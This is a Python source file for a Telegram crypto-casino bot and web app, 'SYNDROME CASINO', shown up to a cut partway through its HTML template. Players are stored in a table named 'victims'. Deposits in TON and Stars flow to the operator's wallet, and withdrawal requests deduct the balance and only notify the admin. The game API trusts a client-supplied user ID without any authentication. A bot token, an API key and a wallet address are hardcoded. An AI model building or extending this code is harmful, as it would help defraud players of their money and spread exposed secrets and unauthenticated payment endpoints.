import asyncio
import logging
import sqlite3
import random
import hashlib
import os
import sys
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string

# Настройка логирования
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, MenuButtonWebApp, BotCommand,
    Message, CallbackQuery, LabeledPrice, PreCheckoutQuery
)
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode, ContentType
from aiogram.client.default import DefaultBotProperties

# =================================================================
# КОНФИГУРАЦИЯ (ЗАПОЛНИ СВОИ ДАННЫЕ!)
# =================================================================
BOT_TOKEN = "8978316248:AAF4n6jG5gr4quppre6H1NB7U9LjEjnESqs"  # <-- СЮДА ТОКЕН!
ADMIN_ID = 7753887058  # <-- ТВОЙ TELEGRAM ID
TON_WALLET = "UQDRRRGutl_ccP25XcwbOK-RN2UXuvE1_GFoerlaIDvmwO7I"  # <-- КОШЕЛЕК
TONCENTER_API_KEY = "12237ee2c684a00cd473582230a4d9efea8b51b6baf2322883e4ef52f5d34390"  # <-- API КЛЮЧ TONCENTER
TONCENTER_URL = "https://toncenter.com/api/v2"

# URL приложения (Render даст после деплоя)
RENDER_URL = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:8080')
WEBAPP_URL = f"https://syndrome-bot-1.onrender.com"

logger.info(f"Starting with URL: {WEBAPP_URL}")
logger.info(f"Admin ID: {ADMIN_ID}")

# =================================================================
# БАЗА ДАННЫХ
# =================================================================
DB_PATH = '/opt/render/project/data/syndrome_casino.db'

def init_db():
    # Создаем директорию если её нет
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE IF NOT EXISTS victims (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            balance_ton REAL DEFAULT 0,
            balance_stars INTEGER DEFAULT 0,
            total_deposited_ton REAL DEFAULT 0,
            total_deposited_stars INTEGER DEFAULT 0,
            total_withdrawn_ton REAL DEFAULT 0,
            total_withdrawn_stars INTEGER DEFAULT 0,
            total_wins INTEGER DEFAULT 0,
            total_games INTEGER DEFAULT 0,
            last_activity TIMESTAMP,
            pending_payment_id TEXT,
            pending_payment_time TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            currency TEXT,
            tx_hash TEXT,
            status TEXT DEFAULT 'pending',
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS withdrawal_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            currency TEXT,
            wallet_address TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

# =================================================================
# ФУНКЦИИ
# =================================================================
def generate_payment_id(user_id):
    timestamp = int(datetime.now().timestamp())
    raw = f"SYN{user_id}X{timestamp}X{random.randint(1000,9999)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def verify_ton_transaction(wallet_address, comment, hours=24):
    try:
        params = {'address': wallet_address, 'limit': 50, 'api_key': TONCENTER_API_KEY}
        response = requests.get(f"{TONCENTER_URL}/getTransactions", params=params, timeout=10)
        if response.status_code != 200:
            return None
        data = response.json()
        if not data.get('ok'):
            return None
        transactions = data.get('result', [])
        cutoff_time = datetime.now() - timedelta(hours=hours)
        for tx in transactions:
            in_msg = tx.get('in_msg', {})
            if not in_msg:
                continue
            source = in_msg.get('source', '')
            if source == wallet_address:
                continue
            value_ton = int(in_msg.get('value', 0)) / 1_000_000_000
            msg_comment = in_msg.get('message', '')
            if comment.upper() in msg_comment.upper():
                tx_time = datetime.fromtimestamp(tx.get('utime', 0))
                if tx_time > cutoff_time:
                    return {
                        'hash': tx.get('hash', ''),
                        'amount': value_ton,
                        'from': source,
                        'time': tx_time.isoformat()
                    }
        return None
    except Exception as e:
        logger.error(f"TON error: {e}")
        return None

# =================================================================
# БОТ
# =================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def start_command(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    first_name = message.from_user.first_name or "Player"
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR IGNORE INTO victims (user_id, username, first_name, last_activity) 
        VALUES (?, ?, ?, CURRENT_TIMESTAMP)
    ''', (user_id, username, first_name))
    conn.commit()
    conn.close()
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(
        text="🎰 ЗАПУСТИТЬ SYNDROME CASINO",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ", callback_data="deposit_menu"))
    keyboard.add(InlineKeyboardButton(text="💼 ПРОФИЛЬ", callback_data="profile"))
    keyboard.adjust(1)
    
    await message.answer(
        "🔥 *SYNDROME CASINO — TON & STARS CASINO* 🔥\n\n"
        "🎰 *Слоты, Рулетка, Кости, Блэкджек*\n"
        "💎 *Пополнение через TON и Telegram Stars*\n"
        "💰 *Мгновенные выплаты от 10 TON*\n"
        "⚡ *Минимальная ставка: 1 TON / 10 Stars*\n\n"
        "🎁 *НАЖМИ НА КНОПКУ НИЖЕ!*",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data == "deposit_menu")
async def deposit_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="💎 ПОПОЛНИТЬ TON", callback_data="deposit_ton"))
    keyboard.add(InlineKeyboardButton(text="⭐ ПОПОЛНИТЬ STARS", callback_data="deposit_stars"))
    keyboard.add(InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu"))
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        "💰 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
        "💎 *TON* — криптовалюта\n"
        "⭐ *Stars* — Звезды Telegram\n\n"
        "Минимум: 1 TON или 10 Stars",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton(callback: CallbackQuery):
    user_id = callback.from_user.id
    payment_id = generate_payment_id(user_id)
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE victims 
        SET pending_payment_id = ?, pending_payment_time = CURRENT_TIMESTAMP 
        WHERE user_id = ?
    ''', (payment_id, user_id))
    conn.commit()
    conn.close()
    
    await callback.message.edit_text(
        "💎 *ПОПОЛНЕНИЕ TON*\n\n"
        f"📤 Отправьте TON на кошелёк:\n\n"
        f"`{TON_WALLET}`\n\n"
        f"📝 *КОД В КОММЕНТАРИИ:*\n"
        f"`{payment_id}`\n\n"
        f"⚠️ Минимум: *1 TON*\n"
        f"Без кода платёж НЕ зачислится!\n\n"
        f"После отправки нажмите проверку.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"checkpay_{payment_id}")],
            [InlineKeyboardButton(text="🔄 НОВЫЙ КОД", callback_data="deposit_ton")],
            [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "deposit_stars")
async def deposit_stars(callback: CallbackQuery):
    await callback.message.answer_invoice(
        title="SYNDROME CASINO - Stars",
        description="Пополнение баланса казино через Telegram Stars\n1 звезда = 0.1 TON эквивалент",
        payload="stars_deposit",
        provider_token="",
        currency="XTR",
        prices=[
            LabeledPrice(label="10 Stars", amount=10),
            LabeledPrice(label="50 Stars", amount=50),
            LabeledPrice(label="100 Stars", amount=100),
            LabeledPrice(label="500 Stars", amount=500),
            LabeledPrice(label="1000 Stars", amount=1000)
        ]
    )
    await callback.answer()

@dp.pre_checkout_query()
async def pre_checkout(pre_checkout: PreCheckoutQuery):
    await pre_checkout.answer(ok=True)

@dp.message(F.content_type == ContentType.SUCCESSFUL_PAYMENT)
async def successful_payment(message: Message):
    user_id = message.from_user.id
    payment = message.successful_payment
    
    if payment.invoice_payload == "stars_deposit":
        stars_amount = payment.total_amount
        ton_equivalent = stars_amount * 0.1
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE victims 
            SET balance_stars = balance_stars + ?, 
                balance_ton = balance_ton + ?,
                total_deposited_stars = total_deposited_stars + ?
            WHERE user_id = ?
        ''', (stars_amount, ton_equivalent, stars_amount, user_id))
        cursor.execute('''
            INSERT INTO transactions (user_id, type, amount, currency, tx_hash, status)
            VALUES (?, 'stars_deposit', ?, 'STARS', ?, 'completed')
        ''', (user_id, stars_amount, payment.telegram_payment_charge_id))
        conn.commit()
        conn.close()
        
        await message.answer(
            f"✅ *ПОПОЛНЕНИЕ ЗВЕЗДАМИ!*\n\n"
            f"⭐ Зачислено: *{stars_amount} Stars*\n"
            f"💎 Эквивалент: *{ton_equivalent:.2f} TON*\n\n"
            f"🎰 Играйте в казино!"
        )
        
        try:
            await bot.send_message(
                ADMIN_ID,
                f"⭐ *НОВЫЙ ПЛАТЕЖ ЗВЕЗДАМИ!*\n"
                f"👤 @{message.from_user.username or 'Unknown'}\n"
                f"⭐ Сумма: *{stars_amount} Stars*"
            )
        except:
            pass

@dp.callback_query(F.data.startswith("checkpay_"))
async def check_payment(callback: CallbackQuery):
    payment_id = callback.data.replace("checkpay_", "")
    user_id = callback.from_user.id
    
    await callback.message.edit_text(
        "🔍 *ПРОВЕРКА ТРАНЗАКЦИИ*\n\nСканирую блокчейн TON...",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 ОБНОВИТЬ", callback_data=f"checkpay_{payment_id}")]
        ])
    )
    
    result = verify_ton_transaction(TON_WALLET, payment_id)
    
    if result:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        amount_ton = result['amount']
        
        cursor.execute('''
            UPDATE victims 
            SET balance_ton = balance_ton + ?, 
                total_deposited_ton = total_deposited_ton + ?, 
                pending_payment_id = NULL
            WHERE user_id = ?
        ''', (amount_ton, amount_ton, user_id))
        cursor.execute('''
            INSERT INTO transactions (user_id, type, amount, currency, tx_hash, status)
            VALUES (?, 'ton_deposit', ?, 'TON', ?, 'completed')
        ''', (user_id, amount_ton, result['hash']))
        conn.commit()
        conn.close()
        
        try:
            await bot.send_message(
                ADMIN_ID,
                f"💰 *ПЛАТЕЖ TON!*\n"
                f"👤 @{callback.from_user.username or 'Unknown'}\n"
                f"💎 Сумма: *{amount_ton:.4f} TON*"
            )
        except:
            pass
        
        await callback.message.edit_text(
            f"✅ *ПЛАТЕЖ ЗАЧИСЛЕН!*\n\n"
            f"💰 Зачислено: *{amount_ton:.4f} TON*\n\n"
            f"🎰 Играйте в казино!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    else:
        await callback.message.edit_text(
            "❌ *ПЛАТЕЖ НЕ НАЙДЕН*\n\n"
            "• Проверьте код в комментарии\n"
            "• Транзакция может идти до 5 минут\n"
            "• Минимум: 1 TON",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ СНОВА", callback_data=f"checkpay_{payment_id}")],
                [InlineKeyboardButton(text="💎 НОВЫЙ ПЛАТЕЖ", callback_data="deposit_ton")],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile(callback: CallbackQuery):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    user_id = callback.from_user.id
    
    cursor.execute('''
        SELECT balance_ton, balance_stars, total_deposited_ton, 
               total_deposited_stars, total_wins, total_games
        FROM victims WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        ton_bal, stars_bal, ton_dep, stars_dep, wins, games = result
        win_rate = round((wins / games) * 100) if games > 0 else 0
        
        await callback.message.edit_text(
            f"💼 *ПРОФИЛЬ*\n\n"
            f"👤 {callback.from_user.first_name}\n"
            f"👑 VIP Status\n\n"
            f"💰 *БАЛАНСЫ*\n"
            f"💎 TON: *{ton_bal:.4f}*\n"
            f"⭐ Stars: *{stars_bal}*\n\n"
            f"📥 *ПОПОЛНЕНИЯ*\n"
            f"💎 TON: *{ton_dep:.2f}*\n"
            f"⭐ Stars: *{stars_dep}*\n\n"
            f"🎰 *СТАТИСТИКА*\n"
            f"🏆 Побед: *{wins}*\n"
            f"🎮 Игр: *{games}*\n"
            f"📈 Win Rate: *{win_rate}%*",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💎 ВЫВЕСТИ TON", callback_data="withdraw_ton")],
                [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    await callback.answer()

@dp.callback_query(F.data == "withdraw_ton")
async def withdraw_ton_prompt(callback: CallbackQuery):
    await callback.message.edit_text(
        "💎 *ВЫВОД TON*\n\n"
        "Отправьте сообщение:\n"
        "`/withdraw СУММА КОШЕЛЕК`\n\n"
        "Пример: `/withdraw 10 EQD...`\n\n"
        "⚠️ Минимум: 10 TON",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.message(Command("withdraw"))
async def withdraw_ton(message: Message):
    user_id = message.from_user.id
    
    try:
        parts = message.text.split()
        amount = float(parts[1])
        wallet = parts[2] if len(parts) > 2 else None
        
        if not wallet:
            await message.reply("❌ Укажите адрес кошелька!")
            return
        if amount < 10:
            await message.reply("❌ Минимум: 10 TON!")
            return
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT balance_ton FROM victims WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        
        if not result or result[0] < amount:
            await message.reply("❌ Недостаточно TON!")
            conn.close()
            return
        
        cursor.execute('''
            UPDATE victims 
            SET balance_ton = balance_ton - ?, total_withdrawn_ton = total_withdrawn_ton + ?
            WHERE user_id = ?
        ''', (amount, amount, user_id))
        cursor.execute('''
            INSERT INTO withdrawal_requests (user_id, amount, currency, wallet_address, status)
            VALUES (?, ?, 'TON', ?, 'pending')
        ''', (user_id, amount, wallet))
        conn.commit()
        conn.close()
        
        await message.reply(
            f"✅ *ЗАЯВКА НА ВЫВОД!*\n\n"
            f"💎 Сумма: *{amount} TON*\n"
            f"📤 Кошелёк: `{wallet}`\n\n"
            f"⏳ Ожидает обработки (до 24ч)"
        )
        
        try:
            await bot.send_message(
                ADMIN_ID,
                f"📤 *ЗАЯВКА НА ВЫВОД!*\n"
                f"👤 @{message.from_user.username or 'Unknown'}\n"
                f"💎 Сумма: *{amount} TON*\n"
                f"📤 Кошелёк: `{wallet}`"
            )
        except:
            pass
    except:
        await message.reply("❌ Формат: /withdraw СУММА КОШЕЛЕК")

@dp.callback_query(F.data == "main_menu")
async def main_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="🎰 ЗАПУСТИТЬ КАЗИНО", web_app=WebAppInfo(url=WEBAPP_URL)))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ", callback_data="deposit_menu"))
    keyboard.add(InlineKeyboardButton(text="💼 ПРОФИЛЬ", callback_data="profile"))
    keyboard.adjust(1)
    
    await callback.message.edit_text("🔥 *SYNDROME CASINO — МЕНЮ*", reply_markup=keyboard.as_markup())
    await callback.answer()

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*), COALESCE(SUM(total_deposited_ton), 0), COALESCE(SUM(total_deposited_stars), 0) FROM victims')
    users, ton, stars = cursor.fetchone()
    cursor.execute("SELECT COUNT(*) FROM withdrawal_requests WHERE status = 'pending'")
    pending = cursor.fetchone()[0]
    conn.close()
    
    await message.answer(
        f"👑 *АДМИН-ПАНЕЛЬ*\n\n"
        f"👥 Пользователей: *{users}*\n"
        f"💎 Депозитов TON: *{ton:.2f}*\n"
        f"⭐ Депозитов Stars: *{stars}*\n"
        f"📤 Ожидают вывода: *{pending}*"
    )

# =================================================================
# FLASK + WEBAPP
# =================================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def webapp():
    return render_template_string(HTML_TEMPLATE)

@flask_app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT balance_ton, balance_stars, total_wins, total_games, 
                   total_deposited_ton, total_deposited_stars
            FROM victims WHERE user_id = ?
        ''', (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return jsonify({
                'balance_ton': result[0],
                'balance_stars': result[1],
                'total_wins': result[2],
                'total_games': result[3],
                'deposited_ton': result[4],
                'deposited_stars': result[5]
            })
    except:
        pass
    
    return jsonify({
        'balance_ton': 0, 'balance_stars': 0,
        'total_wins': 0, 'total_games': 0,
        'deposited_ton': 0, 'deposited_stars': 0
    })

@flask_app.route('/api/game', methods=['POST'])
def process_game():
    data = request.json
    user_id = data.get('user_id')
    game_type = data.get('game_type')
    bet_amount = float(data.get('bet_amount', 0))
    currency = data.get('currency', 'TON')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        if currency == 'TON':
            cursor.execute('SELECT balance_ton FROM victims WHERE user_id = ?', (user_id,))
        else:
            cursor.execute('SELECT balance_stars FROM victims WHERE user_id = ?', (user_id,))
        
        result = cursor.fetchone()
        
        if not result or result[0] < bet_amount:
            conn.close()
            return jsonify({'error': 'Insufficient balance', 'message': 'Недостаточно средств!'}), 400
        
        win = random.choices([True, False], weights=[30, 70])[0]
        multiplier = 0
        
        if win:
            multipliers = [1.5, 2, 3, 5, 10]
            weights = [30, 30, 25, 10, 5]
            total_weight = sum(weights)
            r = random.random() * total_weight
            
            for i, m in enumerate(multipliers):
                r -= weights[i]
                if r <= 0:
                    multiplier = m
                    break
            
            win_amount = bet_amount * multiplier
            
            if currency == 'TON':
                cursor.execute('''
                    UPDATE victims 
                    SET balance_ton = balance_ton + ?, total_wins = total_wins + 1, total_games = total_games + 1 
                    WHERE user_id = ?
                ''', (win_amount - bet_amount, user_id))
            else:
                cursor.execute('''
                    UPDATE victims 
                    SET balance_stars = balance_stars + ?, total_wins = total_wins + 1, total_games = total_games + 1 
                    WHERE user_id = ?
                ''', (int(win_amount - bet_amount), user_id))
        else:
            win_amount = 0
            if currency == 'TON':
                cursor.execute('''
                    UPDATE victims 
                    SET balance_ton = balance_ton - ?, total_games = total_games + 1 
                    WHERE user_id = ?
                ''', (bet_amount, user_id))
            else:
                cursor.execute('''
                    UPDATE victims 
                    SET balance_stars = balance_stars - ?, total_games = total_games + 1 
                    WHERE user_id = ?
                ''', (int(bet_amount), user_id))
        
        cursor.execute('''
            INSERT INTO transactions (user_id, type, amount, currency, status)
            VALUES (?, ?, ?, ?, 'completed')
        ''', (user_id, f"{game_type}_{'win' if win else 'lose'}", win_amount if win else bet_amount, currency))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'win': win,
            'amount': win_amount,
            'multiplier': multiplier,
            'currency': currency
        })
    except Exception as e:
        logger.error(f"Game error: {e}")
        return jsonify({'error': 'Server error'}), 500

@flask_app.route('/webhook', methods=['POST'])
async def webhook():
    if request.method == 'POST':
        update = request.get_json()
        try:
            await dp.feed_raw_update(update)
        except Exception as e:
            logger.error(f"Webhook error: {e}")
        return 'ok', 200
    return 'error', 400

@flask_app.route('/health')
def health():
    return jsonify({'status': 'ok', 'url': WEBAPP_URL})

# HTML шаблон (сокращенная версия, полная версия в предыдущем ответе)
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0a0a1a">
    <title>SYNDROME CASINO</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a1a; color:#fff; font-family:'Inter',sans-serif; min-height:100vh; }
        .app-container { max-width:480px; margin:0 auto; padding:16px 16px 100px; }
        .header { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:20px; padding:16px; margin-bottom:16px; display:flex; align-items:center; gap:12px; }
        .avatar { width:48px; height:48px; border-radius:50%; background:linear-gradient(135deg,#7c3aed,#a855f7); display:flex; align-items:center; justify-content:center; font-size:24px; font-weight:700; }
        .user-name { font-size:16px; font-weight:700; }
        .user-status { font-size:12px; color:#ffd700; }
        .balance-card { background:linear-gradient(135deg,rgba(124,58,237,0.2),rgba(59,130,246,0.2)); border:1px solid rgba(124,58,237,0.3); border-radius:20px; padding:20px; margin-bottom:20px; }
        .balance-label { font-size:12px; color:#8a8aa8; text-transform:uppercase; margin-bottom:8px; }
        .balance-row { display:flex; justify-content:space-around; align-items:center; }
        .balance-amount { font-size:28px; font-weight:900; background:linear-gradient(135deg,#ffd700,#ff8c00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .balance-currency { font-size:11px; color:#8a8aa8; margin-top:4px; }
        .balance-divider { width:1px; height:50px; background:rgba(255,255,255,0.15); }
        .tabs { display:flex; background:#12122a; border-radius:16px; padding:4px; margin-bottom:20px; gap:4px; }
        .tab { flex:1; padding:12px; text-align:center; border-radius:12px; cursor:pointer; font-weight:600; font-size:14px; color:#8a8aa8; border:none; background:transparent; }
        .tab.active { background:linear-gradient(135deg,#7c3aed,#a855f7); color:#fff; }
        .tab-content { display:none; }
        .tab-content.active { display:block; }
        .currency-select { display:flex; gap:8px; margin-bottom:16px; }
        .currency-btn { flex:1; padding:12px; border-radius:12px; border:1px solid rgba(255,255,255,0.08); background:transparent; color:#fff; cursor:pointer; font-weight:600; }
        .currency-btn.active { background:linear-gradient(135deg,#ffd700,#ff8c00); color:#000; }
        .games-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
        .game-card { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:20px; padding:20px; text-align:center; cursor:pointer; transition:all 0.3s; }
        .game-card:hover { transform:translateY(-3px); border-color:rgba(255,215,0,0.4); }
        .game-card.disabled { opacity:0.4; pointer-events:none; }
        .game-icon { font-size:40px; margin-bottom:8px; }
        .game-name { font-size:15px; font-weight:600; }
        .game-bet { font-size:12px; color:#ffd700; }
        .game-badge { position:absolute; top:10px; right:10px; background:linear-gradient(135deg,#ff2d55,#ff6b6b); color:#fff; padding:4px 8px; border-radius:8px; font-size:10px; font-weight:700; }
        .deposit-card { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:20px; padding:24px; margin-bottom:12px; cursor:pointer; text-align:center; }
        .deposit-card:hover { border-color:rgba(255,215,0,0.4); transform:translateY(-2px); }
        .deposit-icon { font-size:48px; margin-bottom:12px; }
        .deposit-name { font-size:18px; font-weight:700; }
        .deposit-desc { font-size:13px; color:#8a8aa8; }
        .profile-card { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:20px; padding:20px; margin-bottom:12px; }
        .stat-row { display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(255,255,255,0.08); }
        .stat-row:last-child { border-bottom:none; }
        .stat-label-profile { color:#8a8aa8; font-size:14px; }
        .stat-value-profile { font-weight:700; font-size:16px; }
        .profile-btn { background:linear-gradient(135deg,#7c3aed,#a855f7); color:#fff; border:none; padding:16px; border-radius:14px; font-size:15px; font-weight:700; cursor:pointer; width:100%; margin-top:12px; }
        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; align-items:center; justify-content:center; }
        .modal.active { display:flex; }
        .modal-content { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:24px; padding:24px; width:90%; max-width:400px; text-align:center; position:relative; }
        .modal-close { position:absolute; top:16px; right:16px; background:rgba(255,255,255,0.1); border:none; color:#fff; width:36px; height:36px; border-radius:50%; font-size:18px; cursor:pointer; }
        .modal-title { font-size:24px; font-weight:800; margin-bottom:24px; background:linear-gradient(135deg,#ffd700,#ff8c00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .slot-container { display:flex; gap:12px; justify-content:center; margin:24px 0; }
        .slot-reel { width:80px; height:80px; background:rgba(255,255,255,0.05); border:2px solid rgba(255,255,255,0.08); border-radius:16px; display:flex; align-items:center; justify-content:center; font-size:36px; }
        .slot-reel.spinning { animation:reelSpin 0.1s linear infinite; border-color:#ffd700; }
        @keyframes reelSpin { 0%{transform:translateY(-10px);} 50%{transform:translateY(10px);} 100%{transform:translateY(-10px);} }
        .roulette-wheel { width:200px; height:200px; border-radius:50%; background:conic-gradient(#ff2d55 0deg 36deg,#000 36deg 72deg,#ff2d55 72deg 108deg,#000 108deg 144deg,#ff2d55 144deg 180deg,#000 180deg 216deg,#ff2d55 216deg 252deg,#000 252deg 288deg,#ff2d55 288deg 324deg,#000 324deg 360deg); margin:24px auto; transition:transform 3s; display:flex; align-items:center; justify-content:center; }
        .roulette-center { width:60px; height:60px; background:#0a0a1a; border-radius:50%; font-size:24px; font-weight:700; color:#ffd700; display:flex; align-items:center; justify-content:center; }
        .game-btn { background:linear-gradient(135deg,#7c3aed,#a855f7); color:#fff; border:none; padding:16px; border-radius:16px; font-size:16px; font-weight:700; cursor:pointer; width:100%; margin-top:16px; }
        .result-banner { padding:16px; border-radius:16px; margin:16px 0; font-weight:700; font-size:18px; }
        .result-win { background:rgba(16,185,129,0.2); border:1px solid rgba(16,185,129,0.4); color:#10b981; }
        .result-lose { background:rgba(255,45,85,0.2); border:1px solid rgba(255,45,85,0.4); color:#ff2d55; }
        .amount-input { width:100%; padding:18px; background:rgba(255,255,255,0.05); border:2px solid rgba(255,255,255,0.08); border-radius:16px; color:#fff; font-size:24px; font-weight:700; text-align:center; outline:none; }
        .amount-input:focus { border-color:#ffd700; }
        .quick-amounts { display:flex; gap:8px; margin:16px 0; flex-wrap:wrap; }
        .quick-amount-btn { flex:1; padding:10px; border-radius:12px; border:1px solid rgba(255,255,255,0.08); background:rgba(255,255,255,0.05); color:#fff; cursor:pointer; font-weight:600; font-size:13px; min-width:55px; }
        .quick-amount-btn:hover { border-color:#ffd700; }
        .deposit-submit-btn { background:linear-gradient(135deg,#ffd700,#ff8c00); color:#000; border:none; padding:16px; border-radius:16px; font-size:16px; font-weight:700; cursor:pointer; width:100%; }
        .deposit-submit-btn:disabled { opacity:0.5; cursor:not-allowed; }
        .error-message { color:#ff2d55; font-size:12px; margin-top:4px; display:none; }
        .error-message.show { display:block; }
        .toast { position:fixed; top:20px; left:50%; transform:translateX(-50%); background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:16px; padding:16px 24px; z-index:2000; text-align:center; font-weight:600; font-size:14px; white-space:pre-line; }
        .quick-stats { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:16px; }
        .quick-stat { background:#12122a; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:10px; text-align:center; }
        .quick-stat-value { font-size:16px; font-weight:700; color:#ffd700; }
        .quick-stat-label { font-size:10px; color:#8a8aa8; }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <div class="avatar" id="avatar">S</div>
            <div style="flex:1;"><div class="user-name" id="username">Player</div><div class="user-status">VIP</div></div>
            <span style="font-size:24px;">💎</span>
        </div>
        
        <div class="balance-card">
            <div class="balance-label">💰 БАЛАНС</div>
            <div class="balance-row">
                <div style="text-align:center;"><div class="balance-amount" id="tonBalance">0.00</div><div class="balance-currency">TON</div></div>
                <div class="balance-divider"></div>
                <div style="text-align:center;"><div class="balance-amount" id="starsBalance">0</div><div class="balance-currency">STARS</div></div>
            </div>
        </div>
        
        <div class="quick-stats">
            <div class="quick-stat"><div class="quick-stat-value" id="quickWins">0</div><div class="quick-stat-label">🏆 Побед</div></div>
            <div class="quick-stat"><div class="quick-stat-value" id="quickGames">0</div><div class="quick-stat-label">🎮 Игр</div></div>
            <div class="quick-stat"><div class="quick-stat-value" id="quickRate">0%</div><div class="quick-stat-label">📊 Win Rate</div></div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('games')">🎰 ИГРЫ</button>
            <button class="tab" onclick="switchTab('deposit')">💰 ПОПОЛНИТЬ</button>
            <button class="tab" onclick="switchTab('profile')">💼 ПРОФИЛЬ</button>
        </div>
        
        <div class="tab-content active" id="tab-games">
            <div class="currency-select">
                <button class="currency-btn active" onclick="selectCurrency('TON',this)">💎 TON</button>
                <button class="currency-btn" onclick="selectCurrency('STARS',this)">⭐ STARS</button>
            </div>
            <div class="games-grid">
